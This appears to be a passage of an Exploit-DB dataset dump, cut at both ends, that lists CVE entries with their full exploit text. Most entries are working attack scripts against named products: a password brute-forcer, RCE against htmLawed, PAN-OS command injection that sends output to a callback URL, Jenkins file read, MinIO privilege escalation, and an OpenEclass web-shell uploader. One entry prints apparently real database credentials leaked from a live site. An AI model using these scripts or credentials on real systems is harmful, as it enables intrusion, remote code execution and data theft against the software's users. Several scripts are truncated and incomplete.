headers=headers, data=data, ssl=False, allow_redirects=False) as response: if response.status == 302: global exploited exploited = 1 print(f""Exploited Successfully Username: {username}, Password: {password}"") async def main(): tasks = [] for i in range(len(passwords)): session = sessions[i] password = passwords[i] task = asyncio.create_task(send_request(session, username, password)) tasks.append(task) await asyncio.gather(*tasks) asyncio.run(main()) if(not exploited): print(""Exploitation Failed"")"
CVE-2023-27636,2024-06-03,exploit db,"# Exploit Title: Sitefinity 15.0 - Cross-Site Scripting (XSS) # Date: 2023-12-05 # Exploit Author: Aldi Saputra Wahyudi # Vendor Homepage: https://www.progress.com/sitefinity-cms # Version: < 15.0.0 # Tested on: Windows/Linux # CVE : CVE-2023-27636 # Description: In the backend of the Sitefinity CMS, a Cross-site scripting vulnerability has been discovered in all features that use SF-Editor # Steps To Reproduce: Attacker as lower privilege Victim as Higher privilege 1. Login as an Attacker 2. Go to the function using the SF Editor, go to the news page as example 3. Create or Edit news item 4. On the content form, insert the XSS payload as HTML 5. After the payload is inserted, click on the content form (just click) and publish or save 6. If the victim visits the page with XSS payload, XSS will be triggered Payload:"
CVE-2024-34241,2024-05-19,exploit db,# Title: Rocket LMS 1.9 - Persistent Cross Site Scripting (XSS) # Date: 04/16/2024 # Exploit Author: Sergio Medeiros # Vendor Homepage: https://codecanyon.net/item/rocket-lms-learning-management-academy-script/33120735 # Software Link: https://lms.rocket-soft.org # Version: 1.9 # Tested on Firefox and Chrome Browsers # Patched Version: Patch Pending # Category: Web Application # CVE: CVE-2024-34241 # Exploit link: https://grumpz.net/cve-2024-34241-a-step-by-step-discovery-guide
CVE-2024-33559,2024-05-19,exploit db,# Exploit Title: Wordpress Theme XStore 9.3.8 - SQLi # Google Dork: N/A # Date: 2024-05-16 # Exploit Author: [Abdualhadi khalifa (https://twitter.com/absholi_ly) # Version: 5.3.5 # Tested on: Windows10 # CVE: CVE-2024-33559
CVE-2024-32113,2024-05-19,exploit db,# Exploit Title: Apache OFBiz 18.12.12 - Directory Traversal # Google Dork: N/A # Date: 2024-05-16 # Exploit Author: [Abdualhadi khalifa (https://twitter.com/absholi_ly) # Vendor Homepage: https://ofbiz.apache.org/ ## Software Link: https://ofbiz.apache.org/download.html # Version: below <=18.12.12 # Tested on: Windows10
CVE-2022-35914,2024-05-19,exploit db,"# Exploit Title: htmlLawed 1.2.5 - Remote Code Execution (RCE) # Date: 2024-04-24 # Exploit Author: Miguel Redondo (aka d4t4s3c) # Vendor Homepage: https://www.bioinformatics.org/phplabware/internal_utilities/htmLawed # Software Link: https://github.com/kesar/HTMLawed # Version: <= 1.2.5 # Tested on: Linux # CVE: CVE-2022-35914 banner(){ echo "" ______ _______ ____ ___ ____ ____ _________ ___ _ _ _"" echo "" / ___\ \ / / ____| |___ \ / _ \___ \|___ \ |___ / ___|/ _ \/ | || |"" echo ""| | \ \ / /| _| _____ __) | | | |__) | __) |____ |_ \___ \ (_) | | || |_"" echo ""| |___ \ V / | |__|_____/ __/| |_| / __/ / __/_____|__) |__) \__, | |__ _|"" echo "" \____| \_/ |_____| |_____|\___/_____|_____| |____/____/ /_/|_| |_|"" while getopts "":u:c:"" arg; do case $arg in u) URL=$OPTARG; let parameter_counter+=1 ;; c) CMD=$OPTARG; let parameter_counter+=1 ;; esac done if [ -z ""$URL"" ] || [ -z ""$CMD"" ]; then banner echo -e ""\n[i] Usage: ${0} -u -c \n"" exit else banner echo -e ""\n[+] Command output:"" fi curl -s -d ""sid=foo&hhook=exec&text=${CMD}"" -b ""sid=foo"" ${URL} | egrep '\ \[[0-9]+\] =\>'| sed -E 's/\ \[[0-9]+\] =\> (.*) /\1/'"
CVE-2023-6710,2024-05-13,exploit db,"import requests import argparse from bs4 import BeautifulSoup from urllib.parse import urlparse, parse_qs, urlencode, urlunparse from requests.exceptions import RequestException class Colors: RED = '\033[91m' GREEN = '\033[1;49;92m' RESET = '\033[0m' def get_cluster_manager_url(base_url, path): print(Colors.GREEN + f""Preparing the groundwork for the exploitation on {base_url}..."" + Colors.RESET) try: response = requests.get(base_url + path) response.raise_for_status() except requests.exceptions.RequestException as e: print(Colors.RED + f""Error: {e}"" + Colors.RESET) return None print(Colors.GREEN + f""Starting exploit check on {base_url}..."" + Colors.RESET) if response.status_code == 200: print(Colors.GREEN + f""Check executed successfully on {base_url}..."" + Colors.RESET) # Use BeautifulSoup to parse the HTML content soup = BeautifulSoup(response.text, 'html.parser') # Find all 'a' tags with 'href' attribute all_links = soup.find_all('a', href=True) # Search for the link containing the Alias parameter in the href attribute cluster_manager_url = None for link in all_links: parsed_url = urlparse(link['href']) query_params = parse_qs(parsed_url.query) alias_value = query_params.get('Alias', [None])[0] if alias_value: print(Colors.GREEN + f""Alias value found"" + Colors.RESET) cluster_manager_url = link['href'] break if cluster_manager_url: print(Colors.GREEN + f""Preparing the injection on {base_url}..."" + Colors.RESET) return cluster_manager_url else: print(Colors.RED + f""Error: Alias value not found on {base_url}..."" + Colors.RESET) return None print(Colors.RED + f""Error: Unable to get the initial step on {base_url}"") return None def update_alias_value(url): parsed_url = urlparse(url) query_params = parse_qs(parsed_url.query, keep_blank_values=True) query_params['Alias'] = ["" ""] updated_url = urlunparse(parsed_url._replace(query=urlencode(query_params, doseq=True))) print(Colors.GREEN + f""Injection executed successfully on {updated_url}"" + Colors.RESET) return updated_url def check_response_for_value(url, check_value): response = requests.get(url) if check_value in response.text: print(Colors.RED + ""Website is vulnerable"
CVE-2024-3400,2024-04-21,exploit db,"# Exploit Title: Palo Alto PAN-OS < v11.1.2-h3 - Command Injection and Arbitrary File Creation # Date: 21 Apr 2024 # Exploit Author: Kr0ff # Vendor Homepage: https://security.paloaltonetworks.com/CVE-2024-3400 # Software Link: - # Version: PAN-OS 11.1 < 11.1.0-h3, < 11.1.1-h1, < 11.1.2-h3 # PAN-OS 11.0 < 11.0.0-h3, < 11.0.1-h4, < 11.0.2-h4, < 11.0.3-h10, < 11.0.4-h1 # PAN-OS 10.2 < 10.2.0-h3, < 10.2.1-h2, < 10.2.2-h5, < 10.2.3-h13, < 10.2.4-h16, < 10.2.5-h6, < 10.2.6-h3, < 10.2.7-h8, < 10.2.8-h3, < 10.2.9-h1 # Tested on: Debian # CVE : CVE-2024-3400 #!/usr/bin/env python3 import sys try: import argparse import requests except ImportError: print(""Missing dependencies, either requests or argparse not installed"") sys.exit(2) # https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis # https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/ def check_vuln(target: str, file: str) -> bool: ret = False uri = ""/ssl-vpn/hipreport.esp"" s = requests.Session() r = """" headers = { ""User-Agent"" : \ ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"", # Windows 10 Chrome 118.0.0.0 ""Content-Type"": ""application/x-www-form-urlencoded"", ""Cookie"": \ f""SESSID=../../../var/appweb/sslvpndocs/global-protect/portal/images/{file}"" headers_noCookie = { ""User-Agent"" : \ ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"" # Windows 10 Chrome 118.0.0.0 if not ""http://"" or not ""https://"" in target: target = ""http://"" + target try: r = s.post( (target + uri), verify=False, headers=headers, timeout=10 ) except requests.exceptions.Timeout or requests.ConnectionError as e: print(f""Request timed out for \""HTTP\"" !{e}"") print(""Trying with \""HTTPS\""..."") target = ""https://"" + target try: r = s.post( (target + uri), verify=False, headers=headers, timeout=10 ) except requests.exceptions.Timeout or requests.ConnectionError as e: print(f""Request timed out for \""HTTPS\"""") sys.exit(1) else: r = s.post( (target + uri), verify=False, headers=headers, timeout=10 ) if r.status_code == 200: r = s.get( (target + f""/global-protect/portal/images/{file}""), verify=False, headers=headers_noCookie, timeout=10 ) if r.status_code == 403: print(""Target vulnerable to CVE-2024-3400"") ret = True else: return ret return ret def cmdexec(target: str, callback_url: str, payload: str) -> bool: ret = False p = """" if "" "" in payload: p = payload.replace("" "", ""${IFS)"") uri = ""/ssl-vpn/hipreport.esp"" headers = { ""User-Agent"" : \ ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"", # Windows 10 Chrome 118.0.0.0 ""Content-Type"": ""application/x-www-form-urlencoded"", ""Cookie"": \ f""SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/attack782`{callback_url}?r=$({payload})`"" s = requests.Session() r = """" if not ""http://"" or not ""https://"" in target: target = ""http://"" + target try: r = s.post( (target + uri), verify=False, headers=headers, timeout=10 ) except requests.exceptions.Timeout or requests.ConnectionError as e: print(f""Request timed out for \""HTTP\"" !{e}"") print(""Trying with \""HTTPS\""..."") target = ""https://"" + target try: r = s.post( (target + uri), verify=False, headers=headers, timeout=10 ) except requests.exceptions.Timeout or requests.ConnectionError as e: print(f""Request timed out for \""HTTPS\"""") sys.exit(1) else: r = s.post( (target + uri), verify=False, headers=headers, timeout=10 ) if not ""Success"" in r.text: return ret else: ret = True return ret #Initilize parser for arguments def argparser(selection=None): parser = argparse.ArgumentParser( description='CVE-2024-3400 - Palo Alto OS Command Injection' ) subparser = parser.add_subparsers( help=""Available modules"", dest=""module"") exploit_subp = subparser.add_parser( ""exploit"", help=""Exploit module of script"") exploit_subp.add_argument( ""-t"", ""--target"",help=""Target to send payload to"", required=True ) exploit_subp.add_argument( ""-p"", ""--payload"", help=""Payload to send (e.g: whoami)"", required=True ) exploit_subp.add_argument( ""-c"", ""--callbackurl"", help=""The callback url such as burp collaborator or similar"", required=True ) check_subp = subparser.add_parser( ""check"", help=""Vulnerability check module of script"" ) check_subp.add_argument( ""-t"", ""--target"", help=""Target to check if vulnerable"", required=True ) check_subp.add_argument( ""-f"", ""--filename"", help=""Filename of the payload (e.g \""exploitCheck.exp\"""", required=True ) args = parser.parse_args(selection) args = parser.parse_args(args=None if sys.argv[1:] else [""-h""]) if args.module == ""exploit"": cmdexec(args.target, args.callbackurl, args.payload) if args.module == ""check"": check_vuln(args.target, args.filename) if __name__ == ""__main__"": argparser() print(""Finished !"")"
CVE-2024-29291,2024-04-21,exploit db,"# Exploit Title: Laravel Framework 11 - Credential Leakage # Google Dork: N/A # Date: [2024-04-19] # Exploit Author: Huseein Amer # Vendor Homepage: [https://laravel.com/] # Software Link: N/A # Version: 8.* - 11.* (REQUIRED) # Tested on: [N/A] # CVE : CVE-2024-29291 Proof of concept: Go to any Laravel-based website and navigate to storage/logs/laravel.log. Open the file and search for ""PDO->__construct('mysql:host="". The result: shell Copy code #0 /home/u429384055/domains/js-cvdocs.online/public_html/vendor/laravel/framework/src/Illuminate/Database/Connectors/Connector.php(70): PDO->__construct('mysql:host=sql1...', 'u429384055_jscv', 'Jaly$$a0p0p0p0', Array) #1 /home/u429384055/domains/js-cvdocs.online/public_html/vendor/laravel/framework/src/Illuminate/Database/Connectors/Connector.php(46): Illuminate\Database\Connectors\Connector->createPdoConnection('mysql:host=sql1...', 'u429384055_jscv', 'Jaly$$a0p0p0p0', Array) Credentials: Username: u429384055_jscv Password: Jaly$$a0p0p0p0 Host: sql1..."
CVE-2024-31621,2024-04-21,exploit db,"# Exploit Title: Flowise 1.6.5 - Authentication Bypass # Date: 17-April-2024 # Exploit Author: Maerifat Majeed # Vendor Homepage: https://flowiseai.com/ # Software Link: https://github.com/FlowiseAI/Flowise/releases # Version: 1.6.5 # Tested on: mac-os # CVE : CVE-2024-31621 The flowise version <= 1.6.5 is vulnerable to authentication bypass vulnerability. The code snippet this.app.use((req, res, next) => { > if (req.url.includes('/api/v1/')) { > whitelistURLs.some((url) => req.url.includes(url)) ? > next() : basicAuthMiddleware(req, res, next) > } else next() puts authentication middleware for all the endpoints with path /api/v1 except a few whitelisted endpoints. But the code does check for the case sensitivity hence only checks for lowercase /api/v1 . Anyone modifying the endpoints to uppercase like /API/V1 can bypass the authentication."
CVE-2024-22513,2024-04-15,exploit db,"# Exploit Title: djangorestframework-simplejwt 5.3.1 - Information Disclosure # Date: 26/01/2024 # Exploit Author: Dhrumil Mistry (dmdhrumilmistry) # Vendor Homepage: https://github.com/jazzband/djangorestframework-simplejwt/ # Software Link:https://github.com/jazzband/djangorestframework-simplejwt/releases/tag/v5.3.1 # Version: <= 5.3.1 # Tested on: MacOS # CVE : CVE-2024-22513 # The version of djangorestframework-simplejwt up to 5.3.1 is vulnerable. # This vulnerability has the potential to cause various security issues, # including Business Object Level Authorization (BOLA), Business Function # Level Authorization (BFLA), Information Disclosure, etc. The vulnerability # arises from the fact that a user can access web application resources even # after their account has been disabled, primarily due to the absence of proper # user validation checks. # If a programmer generates a JWT token for an inactive user using `AccessToken` # class and `for_user` method then a JWT token is returned which can be used for # authentication across the django and django rest framework application. # Start Django Shell using below command: # python manage.py shell # Create inactive user and generate token for the user from django.contrib.auth.models import User from rest_framework_simplejwt.tokens import AccessToken # create inactive user inactive_user_id = User.objects.create_user('testuser', 'test@example.com', 'testPassw0rd!', is_active=False).id # django application programmer generates token for the inactive user AccessToken.for_user(User.objects.get(id=inactive_user_id)) # error should be raised since user is inactive # django application verifying user token AccessToken.for_user(User.objects.get(id=inactive_user_id)).verify() # no exception is raised during verification of inactive user token"
CVE-2024-23897,2024-04-15,exploit db,"# Exploit Title: Jenkins 2.441 - Local File Inclusion # Date: 14/04/2024 # Exploit Author: Matisse Beckandt (Backendt) # Vendor Homepage: https://www.jenkins.io/ # Software Link: https://github.com/jenkinsci/jenkins/archive/refs/tags/jenkins-2.441.zip # Version: 2.441 # Tested on: Debian 12 (Bookworm) # CVE: CVE-2024-23897 from argparse import ArgumentParser from requests import Session, post, exceptions from threading import Thread from uuid import uuid4 from time import sleep from re import findall class Exploit(Thread): def __init__(self, url: str, identifier: str): Thread.__init__(self) self.daemon = True self.url = url self.params = {""remoting"": ""false""} self.identifier = identifier self.stop_thread = False self.listen = False def run(self): while not self.stop_thread: if self.listen: self.listen_and_print() def stop(self): self.stop_thread = True def receive_next_message(self): self.listen = True def wait_for_message(self): while self.listen: sleep(0.5) def print_formatted_output(self, output: str): if ""ERROR: No such file"" in output: print(""File not found."") elif ""ERROR: Failed to parse"" in output: print(""Could not read file."") expression = ""No such agent \""(.*)\"" exists."" results = findall(expression, output) print(""\n"".join(results)) def listen_and_print(self): session = Session() headers = {""Side"": ""download"", ""Session"": self.identifier} try: response = session.post(self.url, params=self.params, headers=headers) except (exceptions.ConnectTimeout, exceptions.ConnectionError): print(""Could not connect to target to setup the listener."") exit(1) self.print_formatted_output(response.text) self.listen = False def send_file_request(self, filepath: str): headers = {""Side"": ""upload"", ""Session"": self.identifier} payload = get_payload(filepath) try: post(self.url, data=payload, params=self.params, headers=headers, timeout=4) except (exceptions.ConnectTimeout, exceptions.ConnectionError): print(""Could not connect to the target to send the request."") exit(1) def read_file(self, filepath: str): self.receive_next_message() sleep(0.1) self.send_file_request(filepath) self.wait_for_message() def get_payload_message(operation_index: int, text: str) -> bytes: text_bytes = bytes(text, ""utf-8"") text_size = len(text_bytes) text_message = text_size.to_bytes(2) + text_bytes message_size = len(text_message) payload = message_size.to_bytes(4) + operation_index.to_bytes(1) + text_message return payload def get_payload(filepath: str) -> bytes: arg_operation = 0 start_operation = 3 command = get_payload_message(arg_operation, ""connect-node"") poisoned_argument = get_payload_message(arg_operation, f""@{filepath}"") payload = command + poisoned_argument + start_operation.to_bytes(1) return payload def start_interactive_file_read(exploit: Exploit): print(""Press Ctrl+C to exit"") while True: filepath = input(""File to download:\n> "") filepath = make_path_absolute(filepath) exploit.receive_next_message() try: exploit.read_file(filepath) except exceptions.ReadTimeout: print(""Payload request timed out."") def make_path_absolute(filepath: str) -> str: if not filepath.startswith('/'): return f""/proc/self/cwd/{filepath}"" return filepath def format_target_url(url: str) -> str: if url.endswith('/'): url = url[:-1] return f""{url}/cli"" def get_arguments(): parser = ArgumentParser(description=""Local File Inclusion exploit for CVE-2024-23897"") parser.add_argument(""-u"", ""--url"", required=True, help=""The url of the vulnerable Jenkins service. Ex: http://helloworld.com/"") parser.add_argument(""-p"", ""--path"", help=""The absolute path of the file to download"") return parser.parse_args() def main(): args = get_arguments() url = format_target_url(args.url) filepath = args.path identifier = str(uuid4()) exploit = Exploit(url, identifier) exploit.start() if filepath: filepath = make_path_absolute(filepath) exploit.read_file(filepath) exploit.stop() return try: start_interactive_file_read(exploit) except KeyboardInterrupt: pass print(""\nQuitting"") exploit.stop() if __name__ == ""__main__"": main()"
CVE-2023-40278,2024-04-15,exploit db,"# Exploit Title: OpenClinic GA 5.247.01 - Information Disclosure # Date: 2023-08-14 # Exploit Author: VB # Vendor Homepage: https://sourceforge.net/projects/open-clinic/ # Software Link: https://sourceforge.net/projects/open-clinic/ # Version: OpenClinic GA 5.247.01 # Tested on: Windows 10, Windows 11 # CVE: CVE-2023-40278 # Details An Information Disclosure vulnerability was discovered in the printAppointmentPdf.jsp component of OpenClinic GA 5.247.01. The issue arises due to improper handling of error messages in response to manipulated input, allowing an attacker to deduce the existence of specific appointments. # Proof of Concept ("
CVE-2023-40279,2024-04-15,exploit db,"# Exploit Title: OpenClinic GA 5.247.01 - Path Traversal (Authenticated) # Date: 2023-08-14 # Exploit Author: V. B. # Vendor Homepage: https://sourceforge.net/projects/open-clinic/ # Software Link: https://sourceforge.net/projects/open-clinic/ # Version: OpenClinic GA 5.247.01 # Tested on: Windows 10, Windows 11 # CVE: CVE-2023-40279 # Details An issue was discovered in OpenClinic GA version 5.247.01, where an attacker can perform a directory path traversal via the 'Page' parameter in a GET request to 'main.do'. This vulnerability allows for the retrieval and execution of files from arbitrary directories. # Proof of Concept ("
CVE-2024-31804,2024-04-12,exploit db,"# Exploit Title: Terratec dmx_6fire USB - Unquoted Service Path # Google Dork: null # Date: 4/10/2024 # Exploit Author: Joseph Kwabena Fiagbor # Vendor Homepage: https://dmx-6fire-24-96-controlpanel.software.informer.com/download/ # Software Link: # Version: v.1.23.0.02 # Tested on: windows 7-11 # CVE : CVE-2024-31804 1. Description: The Terratec dmx_6fire usb installs as a service with an unquoted service path running with SYSTEM privileges. This could potentially allow an authorized but non-privileged local user to execute arbitrary code with elevated privileges on the system. 2. Proof > C:\Users\Astra>sc qc ""ttdmx6firesvc"" > {SC] QueryServiceConfig SUCCESS > SERVICE_NAME: ttdmx6firesvc > TYPE : 10 WIN32_OWN_PROCESS > START_TYPE : 2 AUTO_START > ERROR_CONTROL : 1 NORMAL > BINARY_PATH_NAME : C:\Program Files\TerraTec\DMX6FireUSB\ttdmx6firesvc.exe -service > LOAD_ORDER_GROUP : PlugPlay > TAG : 0 > DISPLAY_NAME : DMX6Fire Control > DEPENDENCIES : eventlog > : PlugPlay > SERVICE_START_NAME : LocalSystem"
CVE-2024-24747,2024-04-12,exploit db,"# Exploit Title: MinIO < 2024-01-31T20-20-33Z - Privilege Escalation # Date: 2024-04-11 # Exploit Author: Jenson Zhao # Vendor Homepage: https://min.io/ # Software Link: https://github.com/minio/minio/ # Version: Up to (excluding) RELEASE.2024-01-31T20-20-33Z # Tested on: Windows 10 # CVE : CVE-2024-24747 # Required before execution: pip install minio,requests import argparse import datetime import traceback import urllib from xml.dom.minidom import parseString import requests import json import base64 from minio.credentials import Credentials from minio.signer import sign_v4_s3 class CVE_2024_24747: new_buckets = [] old_buckets = [] def __init__(self, host, port, console_port, accesskey, secretkey, verify=False): self.bucket_names = ['pocpublic', 'pocprivate'] self.new_accesskey = 'miniocvepoc' self.new_secretkey = 'MINIOcvePOC' self.headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Accept': '*/*' self.accesskey = accesskey self.secretkey = secretkey self.verify = verify if verify: self.url = ""https://"" + host + "":"" + port self.console_url = ""https://"" + host + "":"" + console_port else: self.url = ""http://"" + host + "":"" + port self.console_url = ""http://"" + host + "":"" + console_port self.credits = Credentials( access_key=self.new_accesskey, secret_key=self.new_secretkey self.login() try: self.create_buckets() self.create_accesskey() self.old_buckets = self.console_ls() self.console_exp() self.new_buckets = self.console_ls() except: traceback.print_stack() finally: self.delete_accesskey() self.delete_buckets() if len(self.new_buckets) > len(self.old_buckets): print(""There is CVE-2024-24747 problem with the minio!"") print(""Before the exploit, the buckets are : "" + str(self.old_buckets)) print(""After the exploit, the buckets are : "" + str(self.new_buckets)) else: print(""There is no CVE-2024-24747 problem with the minio!"") def login(self): url = self.url + ""/api/v1/login"" payload = json.dumps({ ""accessKey"": self.accesskey, ""secretKey"": self.secretkey self.session = requests.session() if self.verify: self.session.verify = False status_code = self.session.request(""POST"", url, headers=self.headers, data=payload).status_code # print(status_code) if status_code == 204: status_code = 0 else: print('Login failed! Please check if the input accesskey and secretkey are correct!') exit(1) def create_buckets(self): url = self.url + ""/api/v1/buckets"" for name in self.bucket_names: payload = json.dumps({ ""name"": name, ""versioning"": False, ""locking"": False status_code = self.session.request(""POST"", url, headers=self.headers, data=payload).status_code # print(status_code) if status_code == 200: status_code = 0 else: print(""新建 (New)""+name+"" bucket 失败 (fail)！"") def delete_buckets(self): for name in self.bucket_names: url = self.url + ""/api/v1/buckets/"" + name status_code = self.session.request(""DELETE"", url, headers=self.headers).status_code # print(status_code) if status_code == 204: status_code = 0 else: print(""删除 (delete)""+name+"" bucket 失败 (fail)！"") def create_accesskey(self): url = self.url + ""/api/v1/service-account-credentials"" payload = json.dumps({ ""policy"": ""{ \n \""Version\"":\""2012-10-17\"", \n \""Statement\"":[ \n { \n \""Effect\"":\""Allow\"", \n \""Action\"":[ \n \""s3:*\"" \n ], \n \""Resource\"":[ \n \""arn:aws:s3:::pocpublic\"", \n \""arn:aws:s3:::pocpublic/*\"" \n ] \n } \n ] \n}"", ""accessKey"": self.new_accesskey, ""secretKey"": self.new_secretkey status_code = self.session.request(""POST"", url, headers=self.headers, data=payload).status_code # print(status_code) if status_code == 201: # print(""新建 (New)"" + self.new_accesskey + "" accessKey 成功 (success)！"") # print(self.new_secretkey) status_code = 0 else: print(""新建 (New)"" + self.new_accesskey + "" accessKey 失败 (fail)！"") def delete_accesskey(self): url = self.url + ""/api/v1/service-accounts/"" + base64.b64encode(self.new_accesskey.encode(""utf-8"")).decode('utf-8') status_code = self.session.request(""DELETE"", url, headers=self.headers).status_code # print(status_code) if status_code == 204: # print(""删除"" + self.new_accesskey + "" accessKey成功！"") status_code = 0 else: print(""删除 (delete)"" + self.new_accesskey + "" accessKey 失败 (fail)！"") def headers_gen(self,url,sha256,method): datetimes = datetime.datetime.utcnow() datetime_str = datetimes.strftime('%Y%m%dT%H%M%SZ') urls = urllib.parse.urlparse(url) headers = { 'X-Amz-Content-Sha256': sha256, 'X-Amz-Date': datetime_str, 'Host': urls.netloc, headers = sign_v4_s3( method=method, url=urls, region='us-east-1', headers=headers, credentials=self.credits, content_sha256=sha256, date=datetimes, return headers def console_ls(self): url = self.console_url + ""/"" sha256 = ""e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"" headers = self.headers_gen(url,sha256,'GET') if self.verify: response = requests.get(url,headers=headers,verify=False) else: response = requests.get(url, headers=headers) DOMTree = parseString(response.text) collection = DOMTree.documentElement buckets = collection.getElementsByTagName(""Bucket"") bucket_names = [] for bucket in buckets: bucket_names.append(bucket.getElementsByTagName(""Name"")[0].childNodes[0].data) # print('当前可查看的bucket有:\n' + str(bucket_names)) return bucket_names def console_exp(self): url = self.console_url + ""/minio/admin/v3/update-service-account?accessKey="" + self.new_accesskey sha256 = ""0f87fd59dff29507f82e189d4f493206ea7f370d0ce97b9cc8c1b7a4e609ec95"" headers = self.headers_gen(url, sha256, 'POST') hex_string = ""e1fd1c29bed167d5cf4986d3f224db2994b4942291dbd443399f249b84c79d9f00b9e0c0c7eed623a8621dee64713a3c8c63e9966ab62fcd982336"" content = bytes.fromhex(hex_string) if self.verify: response = requests.post(url,headers=headers,data=content,verify=False) else: response = requests.post(url,headers=headers,data=content) status_code = response.status_code if status_code == 204: # print(""提升"" + self.new_accesskey + "" 权限成功！"") status_code = 0 else: print(""提升 (promote)"" + self.new_accesskey + "" 权限失败 (Permission failed)！"") if __name__ == '__main__': logo = """""" | (__ \ V / | __/|_____| / __/ | |_| | / __/ |__ _||_____| / __/ |__ _| / / |__ _| / / print(logo) parser = argparse.ArgumentParser() parser.add_argument(""-H"", ""--host"", required=True, help=""Host of the target. example: 127.0.0.1"") parser.add_argument(""-a"", ""--accesskey"", required=True, help=""Minio AccessKey of the target. example: minioadmin"") parser.add_argument(""-s"", ""--secretkey"", required=True, help=""Minio SecretKey of the target. example: minioadmin"") parser.add_argument(""-c"", ""--console_port"", required=True, help=""Minio console port of the target. example: 9000"") parser.add_argument(""-p"", ""--port"", required=True, help=""Minio port of the target. example: 9090"") parser.add_argument(""--https"", action='store_true', help=""Is MinIO accessed through HTTPS."") args = parser.parse_args() CVE_2024_24747(args.host,args.port,args.console_port,args.accesskey,args.secretkey,args.https)"
CVE-2024-31777,2024-04-12,exploit db,"# Exploit Title: GUnet OpenEclass E-learning platform 3.15 - 'certbadge.php' Unrestricted File Upload # Date: 2024-02-04 # Exploit Author: Georgios Tsimpidas # Vendor Homepage: https://www.openeclass.org/ # Software Link: https://download.openeclass.org/files/3.15/ # Version: 3.15 (2024) # Tested on: Debian Kali (Apache/2.4.57, PHP 8.2.12, MySQL 15.1) # CVE : CVE-2024-31777 # GUnet OpenEclass <= 3.15 E-learning platform - Unrestricted File import requests import argparse import zipfile import os import sys RED = '\033[91m' GREEN = '\033[92m' YELLOW = '\033[93m' RESET = '\033[0m' ORANGE = '\033[38;5;208m' MALICIOUS_PAYLOAD = """"""\ """""" def banner(): print(f'''{RED} {YELLOW} ============================ Author: Frey ============================ {RESET}''') def execute_command(openeclass, filename): while True: # Prompt for user input with ""eclass"" cmd = input(f""{RED}[{YELLOW}eClass{RED}]~# {RESET}"") # Check if the command is 'quit', then break the loop if cmd.lower() == ""quit"": print(f""{ORANGE}\nExiting...{RESET}"") clean_server(openeclass) sys.exit() # Construct the URL with the user-provided command url = f""{openeclass}/courses/user_progress_data/cert_templates/{filename}?cmd={cmd}"" # Execute the GET request try: response = requests.get(url) # Check if the request was successful if response.status_code == 200: # Print the response text print(f""{GREEN}{response.text}{RESET}"") except requests.exceptions.RequestException as e: # Print any error that occurs during the request print(f""{RED}An error occurred: {e}{RESET}"") def upload_web_shell(openeclass, username, password): login_url = f'{openeclass}/?login_page=1' login_page_url = f'{openeclass}/main/login_form.php?next=%2Fmain%2Fportfolio.php' # Login credentials payload = { 'next': '/main/portfolio.php', 'uname': f'{username}', 'pass': f'{password}', 'submit': 'Enter' headers = { 'Referer': login_page_url, # Use a session to ensure cookies are handled correctly with requests.Session() as session: # (Optional) Initially visit the login page if needed to get a fresh session cookie or any other required tokens session.get(login_page_url) # Post the login credentials response = session.post(login_url, headers=headers, data=payload) # Create a zip file containing the malicious payload zip_file_path = 'malicious_payload.zip' with zipfile.ZipFile(zip_file_path, 'w') as zipf: zipf.writestr('evil.php', MALICIOUS_PAYLOAD.encode()) # Upload the zip file url = f'{openeclass}/modules/admin/certbadge.php?action=add_cert' files = { 'filename': ('evil.zip', open(zip_file_path, 'rb'), 'application/zip'), 'certhtmlfile': (None, ''), 'orientation': (None, 'L'), 'description': (None, ''), 'cert_id': (None, ''), 'submit_cert_template': (None, '') response = session.post(url, files=files) # Clean up the zip file os.remove(zip_file_path) # Check if the upload was successful if response.status_code == 200: print(f""{GREEN}Payload uploaded successfully!{RESET}"") return True else: print(f""{RED}Failed to upload payload. Exiting...{RESET}"") return False def clean_server(openeclass): print(f""{ORANGE}Cleaning server...{RESET}"") # Remove the uploaded files requests.get(f""{openeclass}/courses/user_progress_data/cert_templates/evil.php?cmd=rm%20evil.zip"") requests.get(f""{openeclass}/courses/user_progress_data/cert_templates/evil.php?cmd=rm%20evil.php"") print(f""{GREEN}Server cleaned successfully!{RESET}"") def main(): parser = argparse.ArgumentParser(description=""Open eClass – CVE-CVE-2024-31777: Unrestricted File Upload Leads to Remote Code Execution"") parser.add_argument('-u', '--username', required=True, help=""Username for login"") parser.add_argument('-p', '--password', required=True, help=""Password for login"") parser.add_argument('-e', '--eclass', required=True, help=""Base URL of the Open eClass"") args = parser.parse_args() banner() # Running the main login and execute command function if upload_web_shell(args.eclass, args.username, args.password): execute_command(args.eclass, 'evil.php') if __name__ == ""__main__"": main()"
CVE-2023-6019,2024-04-12,exploit db,"# Exploit Title: Ray OS v2.6.3 - Command Injection RCE(Unauthorized) # Description: # The Ray Project dashboard contains a CPU profiling page, and the format parameter is # not validated before being inserted into a system command executed in a shell, allowing # for arbitrary command execution. If the system is configured to allow passwordless sudo # (a setup some Ray configurations require) this will result in a root shell being returned # to the user. If not configured, a user level shell will be returned # Version: <= 2.6.3 # Date: 2024-4-10 # Exploit Author: Fire_Wolf # Tested on: Ubuntu 20.04.6 LTS # Vendor Homepage: https://www.ray.io/ # Software Link: https://github.com/ray-project/ray # CVE: CVE-2023-6019 # Refer: https://huntr.com/bounties/d0290f3c-b302-4161-89f2-c13bb28b4cfe # !usr/bin/python3 # coding=utf-8 import base64 import argparse import requests import urllib3 proxies = {""http"": ""127.0.0.1:8080""} headers = { ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"" def check_url(target, port): target_url = target + "":"" + port https = 0 if 'http' not in target: try: urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) test_url = 'http://' + target_url response = requests.get(url=test_url, headers=headers, verify=False, timeout=3) if response.status_code != 200: is_https = 